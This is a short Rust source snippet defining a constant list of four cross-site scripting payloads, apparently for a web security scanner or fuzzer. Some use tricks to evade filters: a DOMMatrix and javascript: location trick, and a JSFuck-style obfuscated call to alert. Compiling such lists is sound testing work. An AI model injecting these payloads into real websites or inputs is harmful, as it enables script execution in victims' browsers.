pub const XSS_JAVASCRIPT_PAYLOADS: &[&str] = &[
    "alert(1)",
    "prompt`1`",
    "x=new DOMMatrix;matrix=confirm;x.a=1;location='javascript'+':'+x",
    "this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])",
];
